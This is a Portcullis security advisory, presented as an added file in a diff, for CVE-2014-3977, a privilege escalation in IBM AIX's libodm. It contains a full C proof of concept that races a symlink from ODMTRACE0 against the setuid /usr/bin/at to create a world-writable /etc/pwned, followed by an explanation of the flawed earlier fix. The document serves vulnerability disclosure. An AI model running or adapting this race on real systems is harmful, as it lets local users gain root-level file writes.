@@ -1,0 +1,55 @@
+Vulnerability title: Privilege Escalation in IBM AIX
+CVE: CVE-2014-3977
+Vendor: IBM
+Product: AIX
+Affected version: 6.1.8 and later
+Fixed version: N/A
+Reported by: Tim Brown
+
+Details:
+
+It has been identified that libodm allows privilege escalation via
+arbitrary file writes with elevated privileges (utilising SetGID and
+SetUID programs). The following will cause a new file /etc/pwned to be
+created with permissions of rw-rw-rw:
+
+#include <stdlib.h> #include <unistd.h> #include <stdio.h> int
+pwnedflag; int main(int argc, char **argv) { pwnedflag = 0; umask(0); if
+(fork()) { setenv("ODMERR", "1", 1); while (!pwnedflag) { if
+(!access("/etc/pwned", F_OK)) { pwnedflag = 1; printf("Race
+won...\r\n"); unsetenv("ODMERR"); exit(EXIT_SUCCESS); }
+system("/usr/bin/at"); } } else { while (!pwnedflag) {
+symlink("/etc/pwned", "ODMTRACE0"); if (!access("/etc/pwned", F_OK)) {
+pwnedflag = 1; printf("Race won...\r\n"); exit(EXIT_SUCCESS); }
+unlink("ODMTRACE0"); } } }
+
+It is believed this is a side affect of CVE-2012-2179 being incorrectly
+resolved. As understood, prior to CVE-2012-2179 being fixed, libodm
+would simply open ODMTRACE0 and write to it assuming ODMERR=1. It is
+believed that the fix that was applied was to check for the presence of
+ODMTRACE0 and increment until no file was found. It is necessary to win
+a time of check, time of use race condition by creating a symlink from
+the ODMTRACE0 in the current working directory to the target file under
+hoping that the link will be added after the check has been made that
+ODMTRACE0 does not exist.
+        
+
+Further details at:
+https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3977/
+
+
+Copyright:
+Copyright (c) Portcullis Computer Security Limited 2014, All rights
+reserved worldwide. Permission is hereby granted for the electronic
+redistribution of this information. It is not to be edited or altered in
+any way without the express written consent of Portcullis Computer
+Security Limited.
+
+Disclaimer:
+The information herein contained may change without notice. Use of this
+information constitutes acceptance for use in an AS IS condition. There
+are NO warranties, implied or otherwise, with regard to this information
+or its use. Any use of this information is at the user's risk. In no
+event shall the author/distributor (Portcullis Computer Security
+Limited) be held liable for any damages whatsoever arising out of or in
+connection with the use or spread of this information.
